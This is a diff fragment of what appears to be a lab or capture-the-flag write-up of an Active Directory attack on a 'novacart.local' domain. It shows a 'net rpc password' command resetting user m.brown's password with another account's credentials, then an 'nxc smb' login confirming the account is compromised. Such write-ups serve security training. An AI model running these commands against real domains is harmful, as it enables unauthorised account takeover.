@@ -1432,4 +1432,14 @@ The user `m.brown` is the most interesting! They have AllowedToDelegate!
 ```python
 net rpc password "m.brown" 'Password123!' -U "novacart.local"/"andrew.collins"%'administrator38' -S "10.0.18.23"
 ```
-This changed the usrs
+This changed the users password
+
+```python
+nxc smb dc.novacart.local -u m.brown -p 'Password123!'                                                          
+SMB         10.0.18.23      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:novacart.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.0.18.23      445    DC               [+] novacart.local\m.brown:Password123!
+```
+This user is now compromised!
+
+![](Pasted%20image%2020260503191248.png)
+
